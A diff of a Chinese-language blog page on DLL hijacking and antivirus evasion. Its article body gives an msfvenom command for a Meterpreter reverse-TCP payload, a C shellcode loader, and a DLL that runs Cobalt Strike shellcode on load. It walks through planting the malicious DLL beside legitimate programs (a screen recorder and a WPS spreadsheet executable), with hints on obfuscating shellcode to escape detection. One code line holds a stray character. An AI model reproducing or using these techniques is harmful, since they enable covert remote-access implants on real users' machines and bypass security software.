@@ -1,327 +1,220 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="zh-CN" color-mode="light">
 
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/ico.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="F4tty">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。《syscall》已经成为了绕过AV&#x2F;EDR所使用的主流方式，可以用它绕过一些敏感函数的调用监控(R3)。主流的AV&#x2F;EDR都会对敏感函数进行HOOK，而syscall则可以用来绕过该类检测。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="DLL劫持与Syscall免杀初尝试">
-<meta property="og:url" content="http://example.com/posts/facab1e5/index.html">
-<meta property="og:site_name" content="F4tty">
-<meta property="og:description" content="《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。《syscall》已经成为了绕过AV&#x2F;EDR所使用的主流方式，可以用它绕过一些敏感函数的调用监控(R3)。主流的AV&#x2F;EDR都会对敏感函数进行HOOK，而syscall则可以用来绕过该类检测。">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220828231531280.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220829082438124.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220829100942828.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220829141832346.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220829142012808.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220829142733847.png">
-<meta property="og:image" content="http://example.com/posts/facab1e5/image-20220829142751524.png">
-<meta property="article:published_time" content="2022-08-28T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-09-03T01:29:14.532Z">
-<meta property="article:author" content="F4tty">
-<meta property="article:tag" content="免杀">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
   
   
+  <title>
+    
+      DLL劫持与Syscall免杀初尝试 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
   
-  <title>DLL劫持与Syscall免杀初尝试 - F4tty</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
   
 
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
 
 
+  
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  
 
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>F4tty&#39;s Note</strong>
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
     </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
+    <div class="nickname"><a href="/">F4tty</a></div>
   </div>
-</nav>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
 
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/indexbg.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="DLL劫持与Syscall免杀初尝试"></span>
-          
-        </div>
+  
 
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DLL劫持与Syscall免杀初尝试</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-08-29 00:00:00
+        </span>
         
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-29 00:00" pubdate>
-          2022年8月29日 凌晨
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          6.8k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          57 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">DLL劫持与Syscall免杀初尝试</h1>
-            
-            
-              <div class="markdown-body">
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
                 
-                <h1 id="DLL劫持与Syscall免杀初尝试"><a href="#DLL劫持与Syscall免杀初尝试" class="headerlink" title="DLL劫持与Syscall免杀初尝试"></a>DLL劫持与Syscall免杀初尝试</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="DLL劫持-语言-调用加载"><a href="#DLL劫持-语言-调用加载" class="headerlink" title="DLL劫持-语言-调用加载"></a>DLL劫持-语言-调用加载</h3><p>利用msf生产payload</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=ip <span class="hljs-attribute">lport</span>=port -f c<br></code></pre></td></tr></table></figure>
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
+                    #免杀
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DLL劫持与Syscall免杀初尝试"><a href="#DLL劫持与Syscall免杀初尝试" class="headerlink" title="DLL劫持与Syscall免杀初尝试"></a>DLL劫持与Syscall免杀初尝试</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="DLL劫持-语言-调用加载"><a href="#DLL劫持-语言-调用加载" class="headerlink" title="DLL劫持-语言-调用加载"></a>DLL劫持-语言-调用加载</h3><p>利用msf生产payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f c</span><br></pre></td></tr></table></figure>
 
 <p>Visual Studio创建动态链接库(DLL)项目</p>
-<p><img src="/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png" srcset="/img/loading.gif" lazyload alt="image-20220828230121536"></p>
+<p><img src="/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png" alt="image-20220828230121536"></p>
 <p>项目生成的dllmain.cpp,pch.cpp重命名为dllmain.c,pch.c </p>
-<p><img src="/posts/facab1e5/image-20220828231531280.png" srcset="/img/loading.gif" lazyload alt="image-20220828231531280"></p>
+<p><img src="/posts/facab1e5/image-20220828231531280.png" alt="image-20220828231531280"></p>
 <p>dllmain.c代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-comment">//msf生产payload</span><br><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    <span class="hljs-type">char</span>* Memory;<br>    Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    ((<span class="hljs-type">void</span>(*)())Memory)();<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="comment">//msf生产payload</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>选择release生成解决方案<br>利用python调用dll文件</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#利用python载入dll文件</span><br>lib=CDLL(<span class="hljs-string">&#x27;Dll1&#x27;</span>)<br><span class="hljs-comment">#调用dll文件内置方法函数</span><br>lib.main()<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#利用python载入dll文件</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;Dll1&#x27;</span>)</span><br><span class="line"><span class="comment">#调用dll文件内置方法函数</span></span><br><span class="line">lib.main()</span><br></pre></td></tr></table></figure>
 
 <p>运行上线</p>
 <h3 id="DLL劫持-白加黑-导入加载"><a href="#DLL劫持-白加黑-导入加载" class="headerlink" title="DLL劫持-白加黑-导入加载"></a>DLL劫持-白加黑-导入加载</h3><p>这里以kk录像机为例</p>
 <p>启动kk录像机使用火绒剑进行分析</p>
-<p><img src="/posts/facab1e5/image-20220829082438124.png" srcset="/img/loading.gif" lazyload alt="image-20220829082438124"></p>
+<p><img src="/posts/facab1e5/image-20220829082438124.png" alt="image-20220829082438124"></p>
 <p>可以看到kk录像机加载的dll文件,我们可以选择一个dll文件来进行劫持,尽量找文件较小的dll文件<br>这里选择libfontconfig-1.dll<br>接下来该构造一个dll了<br>和上文相同新建一个dll项目这次不用改后缀了<br>代码如下</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>HANDLE My_hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <br><span class="hljs-comment">//CS生成32位shellcode</span><br>DWORD  WINAPI  <span class="hljs-built_in">ceshi</span>(LPVOID pParameter)<br>&#123;<br>    __asm<br>    &#123;<br>        mov eax, offset shellcode<br>        jmp eax<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<span class="hljs-comment">//初次调用dll时执行下面代码</span><br>        My_hThread = ::<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;ceshi, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//新建线程</span><br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:a<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">extern</span><span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> a;<br>    a = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">HANDLE My_hThread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="comment">//CS生成32位shellcode</span></span><br><span class="line">DWORD  WINAPI  <span class="built_in">ceshi</span>(LPVOID pParameter)</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">//初次调用dll时执行下面代码</span></span><br><span class="line">        My_hThread = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;ceshi, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//新建线程</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:a</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span><span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    a = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>x86生成<br>接下来利用Stud_PE来加载我们生成的dll<br>函数–右键add–选择生产的dll文件–选择函数test–添加到列表–添加<br>接下来将libfontconfig-1.dll以及我们生产的dll文件都拖到kk录像机安装目录<br>运行kk录像机成功上线但是对生产的dll文件依旧被杀<br>可以对shellcode利用aes或者xor混淆进一步处理</p>
-<h3 id="C-amp-C-DLL劫持-白加黑-导出编译"><a href="#C-amp-C-DLL劫持-白加黑-导出编译" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-导出编译"></a>C&amp;C++-DLL劫持-白加黑-导出编译</h3><p>当遇到部分应用，对dll进行了防劫持的操作，上述方法失效时，可以使用导出编译<br>也就是把目标dll文件反编译然后做文章<br>这里使用wps中的et.exe劫持krpt.dll<br>利用工具Dependencies反编译dll文件<br><img src="/posts/facab1e5/image-20220829100942828.png" srcset="/img/loading.gif" lazyload alt="image-20220829100942828"></p>
+<h3 id="C-amp-C-DLL劫持-白加黑-导出编译"><a href="#C-amp-C-DLL劫持-白加黑-导出编译" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-导出编译"></a>C&amp;C++-DLL劫持-白加黑-导出编译</h3><p>当遇到部分应用，对dll进行了防劫持的操作，上述方法失效时，可以使用导出编译<br>也就是把目标dll文件反编译然后做文章<br>这里使用wps中的et.exe劫持krpt.dll<br>利用工具Dependencies反编译dll文件<br><img src="/posts/facab1e5/image-20220829100942828.png" alt="image-20220829100942828"></p>
 <p>和上文相同创建一个dll项目将反编译出来的文件拖入到项目文件夹,然后拖入到vs中<br>先修改.asm汇编文件删除所有jump语句<br>例如：<code>jmp pfnAL__krpt_RegisterWERHandler</code><br>接下来修改.asm的属性具体的修改方法会在.asm文件的前几行按照说法进行修改</p>
 <p>注意配置和平台要和你要生成的结果一致</p>
-<p><img src="/posts/facab1e5/image-20220829141832346.png" srcset="/img/loading.gif" lazyload alt="image-20220829141832346"><br>先应用下面的才会出来<br><img src="/posts/facab1e5/image-20220829142012808.png" srcset="/img/loading.gif" lazyload alt="image-20220829142012808"><br>接下来设置项目属性（注意平台以及配置要和你编译环境相同配置应该为release，平台x86就用win32 x64就用x64）<br><img src="/posts/facab1e5/image-20220829142733847.png" srcset="/img/loading.gif" lazyload alt="image-20220829142733847"><br><img src="/posts/facab1e5/image-20220829142751524.png" srcset="/img/loading.gif" lazyload alt="image-20220829142751524"></p>
